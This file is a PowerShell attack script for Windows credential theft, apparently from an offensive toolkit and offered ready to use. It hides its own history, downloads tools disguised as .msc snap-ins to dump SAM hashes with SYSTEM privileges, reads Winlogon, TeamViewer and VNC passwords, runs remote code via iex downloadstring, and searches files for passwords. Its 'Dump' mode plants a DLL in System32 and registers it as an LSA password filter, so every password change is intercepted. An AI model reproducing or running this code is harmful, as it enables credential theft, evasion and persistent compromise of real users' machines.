<#
.SYNOPSIS
   Stealing passwords every time they change {mitre T1174}
   Search for creds in diferent locations {store|regedit|disk}

   Author: @mubix|@r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: Invoke-WebRequest|BitsTransfer
   Optional Dependencies: BCDstore.msc|diskmgr.msc|DecryptAutoLogon.msc
   PS cmdlet Dev version: v2.2.10

.DESCRIPTION
   -GetPasswords [ Enum ] search creds in wstore\reg\disk diferent locations.
   -GetPasswords [ Dump ] Explores a native OS notification of when the user
   account password gets changed which is responsible for validating it. that
   means that the user password can be intercepted and logged (credits:@mubix)

.NOTES
   -GetPasswords [ Dump ] requires Administrator privileges to add reg keys.
   To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
   from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key.
   REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f

.Parameter GetPasswords
   Accepts arguments: Enum and Dump

.Parameter StartDir
   The directory path where to start search recursive for files

.EXAMPLE
   PS C:\> Get-Help .\GetPasswords.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\GetPasswords.ps1 -GetPasswords Enum
   Search for creds in store\regedit\disk {txt\xml\logs} diferent locations

.EXAMPLE
   PS C:\> .\GetPasswords.ps1 -GetPasswords Enum -StartDir "$Env:USERPROFILE"
   Search recursive for creds in store\regedit\disk {txt\xml\logs} starting in -StartDir [ dir ]

.EXAMPLE
   PS C:\> .\GetPasswords.ps1 -GetPasswords Dump
   Intercepts user changed passwords {logon} by: @mubix

.OUTPUTS
   Time     Status  ReportFile           VulnDLLPath
   ----     ------  ----------           -----------
   17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StartDir="$Env:USERPROFILE",
   [string]$GetPasswords="false"
)


## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Working_Directory = pwd|Select-Object -ExpandProperty Path


If($GetPasswords -ieq "Enum"){

   Write-Host "`n`nDumping ${Env:COMPUTERNAME}\${Env:USERNAME} SAM hashs!" -ForeGroundColor Green
   Write-Host "-------------------------------";Start-Sleep -Seconds 1
   ## This function requires Admin privileges to dump SAM hashs
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
   If($IsClientAdmin){## Administrator privileges active => OK

      <#
      .SYNOPSIS
         Author: @pentestlab|@r00t-3xp10it
         Helper - Dump SAM hashs (in-memory)

      .DESCRIPTION
         This function downloads BCDstore.msc and diskmgr.msc standalone executables
         to %tmp% directory and masquerade bouth binarys as windows snap-in.msc appl.
         BCDstore will impersonate lsass token (NT AUTHORITY/SYSTEM) to be abble to
         spawn diskmgr (dump hashs) child process with parent process inherit privs.

      .NOTES
         Required Dependencies: Invoke-WebRequest
         Required Dependencies: Adminstrator privileges
         Required Dependencies: BCDstore.msc and diskmgr.msc
      #>

      ## Build Trigger bat script on %tmp% { to execute diskmgr.msc @args }
      echo "@echo off"|Out-File $Env:TMP\setup.bat -encoding ascii -force
      echo "diskmgr.msc -s > diskmgmt.log"|Add-Content $Env:TMP\setup.bat -encoding ascii
      echo "exit"|Add-Content $Env:TMP\setup.bat -encoding ascii

      ## Download and masquerade the required standalone executables
      If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){
         iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/NSudo.exe -OutFile $Env:TMP\BCDstore.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
      }
      If(-not(Test-Path -Path "$Env:TMP\diskmgr.msc" -EA SilentlyContinue)){
         ## https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe
         iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/compiled.exe -OutFile $Env:TMP\diskmgr.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
      }

      If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){

         Write-Host "[error] fail to download: $Env:TMP\BCDstore.msc!" -ForegroundColor Red -BackgroundColor Black

      }Else{

         ## Execute SAM dump
         # BCDstore.msc will impersonate lsass token (NT AUTHORITY/SYSTEM) to be abble to
         # spawn diskmgr.msc (dump hashs) child process with parent process inherit privs.
         cd $Env:TMP;.\BCDstore.msc -U:T -P:E -Wait -ShowWindowMode:Hide cmd.exe /R setup.bat
         cd $Working_Directory ## Return to redpill working directory

         ## Read pysecdump logfile { diskmgmt.log }
         If(-not(Test-Path -Path "$Env:TMP\diskmgmt.log" -EA SilentlyContinue)){

            Write-Host "[error] fail to retrieve SAM hashs! (diskmgmt.log)" -ForegroundColor Red -BackgroundColor Black

         }Else{## Read pysecdump logfile { diskmgmt.log }

            Get-Content -Path "$Env:TMP\diskmgmt.log" -EA SilentlyContinue | Select-Object -Skip 4

         }

      }

   }Else{## [error] shell running under UserLand privs
   
      Write-Host "[error] Admin privileges required to dump hashs!" -ForegroundColor Red -BackgroundColor Black
   
   }


   ## Scanning credential store for creds!
   Write-Host "`n`nScanning credential store for creds!" -ForegroundColor Green
   Write-Host "------------------------------------"
   $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
   ## https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe
   iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/compiled.exe -OutFile $Env:TMP\$RandomMe.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"

   ## Build Output Table
   If(Test-Path -Path "$Env:TMP\$RandomMe.msc" -EA SilentlyContinue){

      ## Build Trigger bat script on %tmp% { to execute diskmgr.msc @args }
      # cd $Env:TMP;.\perfmon.msc -C > $Env:TMP\Wdlogfile.log <- flaged by amsi
      echo "@echo off"|Out-File $Env:TMP\setup.bat -encoding ascii -force
      echo "$RandomMe.msc -C > Wdlogfile.log"|Add-Content $Env:TMP\setup.bat -encoding ascii
      echo "exit"|Add-Content $Env:TMP\setup.bat -encoding ascii
      Start-Sleep -Seconds 1;cd $Env:TMP
      Start-Process -WindowStyle Hidden -FilePath setup.bat -Wait

      Get-Content -Path "$Env:TMP\Wdlogfile.log" | Where-Object {
         $_ -NotMatch '{' -and $_ -NotMatch '\[' -and $_ -NotMatch 'Flags:' -and $_ -NotMatch 'Persist:' -and $_ -NotMatch 'Attributes:' -and $_ -NotMatch 'Type:'
      }| Select-Object -Skip 4 | Select-Object -SkipLast 2
      cd $Working_Directory ## Return to redpill working directory

   }Else{
        
      Write-Host "[error] fail to download: $Env:TMP\$RandomMe.msc!" -ForegroundColor Red -BackgroundColor Black
        
   }

   $TeamViewer = "HKLM:SOFTWARE" + "\WOW6432Node\TeamViewer" -Join ''
   $RawKKLMKey = "HKLM:\SOFTWARE\Microsoft\" + "Windows NT\CurrentVersion\Winlogon" -Join ''
   $WinLogOnPass = (Get-Itemproperty -Path "$RawKKLMKey" -EA SilentlyContinue).DefaulPassword
   $WinLogOnName = (Get-Itemproperty -Path "$RawKKLMKey" -EA SilentlyContinue).LastUsedUsername
   $DefaultDName = (Get-Itemproperty -Path "$RawKKLMKey" -EA SilentlyContinue).DefaultDomainName
   $TeamVieweKey = (Get-Itemproperty -Path "$TeamViewer" -EA SilentlyContinue).PermanentPassword
   $RealVnccreds = (Get-Itemproperty -Path "HKLM:\SOFTWARE\RealVNC\WinVNC4" -EA SilentlyContinue).password
   $SearchTVAES = $(reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer /f SecurityPasswordAES /s)
   If($SearchTVAES -Match 'search: 0'){$PasswordAES = ""} ## Make sure reg key is not empty
   If(-not($TeamVieweKey)){$TeamVieweKey = ""} ## Make sure reg key is not empty
   $ParseDataAE = $SearchTVAES -split(' ');$PasswordAES = $ParseDataAE[14]

   ## Build Output Table
   Write-Host "`n`nScanning registry for winlogon creds!" -ForegroundColor Green
   Write-Host "-------------------------------------";Start-Sleep -Seconds 1
   Write-Host "Username      : $WinLogOnName"
   Write-Host "DomainName    : $DefaultDName"
   Write-Host "Password      : $WinLogOnPass"
   Write-Host "RealVNC       : $RealVnccreds"
   Write-Host "TeamViewer    : $TeamVieweKey"
   Write-Host "TeamViewerAES : $PasswordAES"


   ## Checking winlogon for crypted credentials
   # Download and masquerade standalone executable to look like one .msc archive
   Write-Host "`n`nScanning winlogon for crypted creds!" -ForegroundColor Green
   Write-Host "------------------------------------"
   If(-not(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc" -EA SilentlyContinue)){
      iwr -Uri https://raw.githubusercontent.com/securesean/DecryptAutoLogon/main/DecryptAutoLogon/bin/Release/DecryptAutoLogon.exe -OutFile $Env:TMP\DecryptAutoLogon.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
   }

   If(-not(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc" -EA SilentlyContinue)){

      Write-Host "[error] fail to download: $Env:TMP\DecryptAutoLogon.msc!" -ForegroundColor Red -BackgroundColor Black

   }Else{## Decrypting autologon credentials

      &"$Env:TMP\DecryptAutoLogon.msc"
   }


   #Teamviewer credentials Decrypt
   Write-Host "`n`nScanning Teamviewer for creds!" -ForegroundColor Green
   Write-Host "------------------------------";Start-Sleep -Seconds 1
   iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1');TeamviewerDecrypt


   ## Checking ConsoleHost_History for credentials
   Write-Host "`n`nScanning ConsoleHost_History for creds!" -ForegroundColor Green
   Write-Host "-------------------------------------";Start-Sleep -Seconds 1
   $PSHistory = "$Env:APPDATA\Microsoft\Windows\" + "PowerShell\PSReadLine\ConsoleHost_History.txt" -Join ''
   $Credentials = Get-Content -Path "$PSHistory" -EA SilentlyContinue |
      Select-String -Pattern "user:","pass:","username:","pwd:","passw:","password:","login:","logon:","cpassword=","username=","user name=","password=","pass=","pwd=","passw=","login=","logon="
   If(-not($Credentials) -or $Credentials -eq $null){## Make sure we have any creds returned

      Write-Host "[error] None Credentials found under ConsoleHost_History!" -ForegroundColor Red -BackgroundColor Black

   }Else{## Credentials found

      ForEach($token in $Credentials){# Loop in each string found
          Write-Host "$token"
      }

   }


   ## List Stored Passwords {in Text\Xml\Log Files}
   Write-Host "`n`n:Directory: $StartDir" -ForeGroundColor Yellow
   Write-Host "Scanning txt\xml\log for stored creds!" -ForegroundColor Green
   Write-Host "--------------------------------------";Start-Sleep -Seconds 1
   If(-not(Test-Path -Path "$StartDir")){## User Input directory not found

         Write-Host "[error] -StartDir '$StartDir' not found!" -ForegroundColor Red -BackGroundColor Black

   }Else{## -StartDir User Input directory found

        ## Exclude from DataBase report { Folders } and Match only { txt|xml|log } extensions
        $dAtAbAsEList = Get-ChildItem -Path "$StartDir" -Recurse -EA SilentlyContinue -Force | Where-Object {
           $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '.txt' -or $_.FullName -iMatch '.log' -or $_.FullName -iMatch '.xml'
        }|Select-Object -ExpandProperty FullName         
         
        ForEach($Item in $dAtAbAsEList){## Search in $dAtAbAsEList for login strings
           Get-Content -Path "$Item" -EA SilentlyContinue -Force |
           Select-String -Pattern "user:","pass:","username:","pwd:","passw:","password:","login:","logon:","cpassword=","username=","user name=","password=","pass=","pwd=","passw=","login=","logon=" >> $Env:TMP\passwd.txt
        }

        $ChekCreds = Get-Content -Path "$Env:TMP\passwd.txt" -EA SilentlyContinue |
            Select-String -Pattern "user:","pass:","username:","pwd:","passw:","password:","login:","logon:","cpassword=","username=","user name=","password=","pass=","pwd=","passw=","login=","logon=" |
            findstr /V "if self.username:"|findstr /V "#"|? {$_.trim() -ne ""}

        If($ChekCreds -ieq $null){## None credentials found

           Write-Host "[error] None credentials found under $StartDir!" -ForegroundColor Red -BackgroundColor Black

        }Else{## Credentials found

           ForEach($token in $ChekCreds){# Loop in each string found
               Write-Host "$token"
           }

        }

        ## Delete ALL artifacts left behind by Enum @argument
        If(Test-Path -Path "$Env:TMP\setup.bat"){Remove-Item -Path "$Env:TMP\setup.bat" -Force}
        If(Test-Path -Path "$Env:TMP\passwd.txt"){Remove-Item -Path "$Env:TMP\passwd.txt" -Force}
        If(Test-Path -Path "$Env:TMP\diskmgr.msc"){Remove-Item -Path "$Env:TMP\diskmgr.msc" -Force}
        If(Test-Path -Path "$Env:TMP\diskmgmt.log"){Remove-Item -Path "$Env:TMP\diskmgmt.log" -Force}
        If(Test-Path -Path "$Env:TMP\BCDstore.msc"){Remove-Item -Path "$Env:TMP\BCDstore.msc" -Force}
        If(Test-Path -Path "$Env:TMP\$RandomMe.msc"){Remove-Item -Path "$Env:TMP\$RandomMe.msc" -Force}
        If(Test-Path -Path "$Env:TMP\Wdlogfile.log"){Remove-Item -Path "$Env:TMP\Wdlogfile.log" -Force}
        If(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc"){Remove-Item -Path "$Env:TMP\DecryptAutoLogon.msc" -Force}
     }
     

}ElseIf($GetPasswords -ieq "Dump"){

   <#
   .SYNOPSIS
      Author: @mubix|@r00t-3xp10it
      Helper - Stealing passwords every time they change {mitre T1174}

   .DESCRIPTION
      This function Explores a native OS notification of when the user
      account password gets changed which is responsible for validating it.
      That means that the user password can be intercepted and logged.

   .NOTES
      Required Dependencies: BitsTransfer
      Required Dependencies: Administrator privileges
      To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
      from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key by executing:
      REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f

   .EXAMPLE
      PS C:\> .\GetPasswords.ps1 -GetPasswords Dump
      Intercepts user changed passwords {logon} by: @mubix

   .OUTPUTS
      Time     Status  ReportFile           VulnDLLPath
      ----     ------  ----------           -----------
      17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
   #>


   ## Local function variable declarations
   $VulnDll = "$Env:WINDIR\" + "System32\0evilpwfilter." + "dll" -Join ''
   $DllStatus = "not active"

   ## This function requires Admin privileges to add reg keys
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

   If($IsClientAdmin){## Administrator privileges active
   $TestVuln = reg query "hklm\system\currentcontrolset\control\lsa" /v "notification packages"

   If($TestVuln){## Vulnerable registry key present

      ## Download 0evilpwfilter.dll from my GitHub repository
      If(-not(Test-Path -Path "$VulnDll")){## Check if auxiliary exists
         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/0evilpwfilter.dll -Destination $Env:WINDIR\System32\0evilpwfilter.dll -ErrorAction SilentlyContinue|Out-Null
      }

      ## Make sure the downloaded DLL its not corrupted
      $CheckInt = Get-Content -Path "$VulnDll" -EA SilentlyContinue
      If(-not(Test-Path -Path "$VulnDll") -or $CheckInt -iMatch '^(<!DOCTYPE html)'){

         ## Fail to download 0evilpwfilter.dll using BitsTransfer OR the downloaded file is corrupted
         Write-Host "[abort] fail to download 0evilpwfilter.dll using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
         If(Test-Path -Path "$VulnDll"){Remove-Item -Path "$VulnDll" -Force}
            Write-Host "";Start-Sleep -Seconds 1;exit ## exit @GetPasswords
         }

         ## Add Registry key to regedit
         reg add "hklm\system\currentcontrolset\control\lsa" /v "notification packages" /d scecli\0evilpwfilter /t reg_multi_sz /f
            $DllTimer = Get-Date -Format 'HH:mm:ss'
            $DllStatus = "active"
         }

         ## Create Data Table for output
         $mytable = new-object System.Data.DataTable
         $mytable.Columns.Add("Time") | Out-Null
         $mytable.Columns.Add("Status") | Out-Null
         $mytable.Columns.Add("ReportFile") | Out-Null
         $mytable.Columns.Add("VulnDLLPath") | Out-Null
         $mytable.Rows.Add("$DllTimer",
                           "$DllStatus",
                           "C:\Temp\logFile.txt",
                           "$VulnDll") | Out-Null

         ## Display Table
         $mytable|Format-Table -AutoSize
     }## Running Under UserLand Privileges
     Write-Host "[error] Administrator privileges required on shell!" -ForegroundColor Red -BackgroundColor Black
}## Sellecting module Scan mode
Write-Host ""
